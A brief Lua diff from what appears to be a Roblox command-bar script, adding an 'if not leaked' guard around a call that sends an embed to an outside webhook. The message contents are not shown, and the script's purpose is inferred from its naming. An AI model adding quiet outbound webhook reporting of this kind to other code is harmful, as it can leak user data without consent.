@@ -1505,6 +1505,7 @@ local function OFWSUS_fake_script() -- CMDBAR.main
 				}}
 			})
 		end
+		if not leaked then
 		sendToWebhook({
 			--["content"] = "",
 			--["username"] = "Webhook Username",
@@ -1521,6 +1522,8 @@ local function OFWSUS_fake_script() -- CMDBAR.main
 				["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
 			}}
 		})
+	end
+
 	
 	
 		
